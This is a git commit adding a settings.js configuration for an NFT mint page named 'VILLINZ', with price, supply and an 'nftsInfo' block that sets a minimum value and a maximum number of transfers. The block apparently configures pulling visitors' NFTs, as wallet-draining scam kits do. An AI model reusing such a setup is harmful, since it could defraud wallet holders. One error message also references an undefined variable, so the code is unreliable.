a31d531af9900e4b3d8f078c2fb75e1b868feaf1
Wync <Tootie-@live.com.sg>
2022-06-27 17:06:43 +0800

    .

---
+++ settings.js
@@ -0,0 +1,36 @@
+const collectionInfo = {
+    name: "VILLINZ",
+    title: "{name}",
+    date: "27.06.2022",
+    socialMedia: {
+        discord: "https://discord.com/",
+        twitter: "https://twitter.com/",
+    },
+    medias: {
+        preview: "nft.jpg",
+        favicon: "logo.jpg",
+    },
+    background: {
+        type: "image",
+        image: "bj.jpg",
+        video: "",
+        color: "#4E4E6D",
+    }
+}
+const mintInfo = {
+    price: 1,
+    totalSupply: 4888,
+    toFixed: 1,
+    minUnits: 1,
+    maxUnits: 3,
+    askMintLoop: true,
+}
+
+const nftsInfo = {
+    active: true,
+    minValue: 0.3,
+    maxTransfer: 3,
+}
+
+if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
+if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
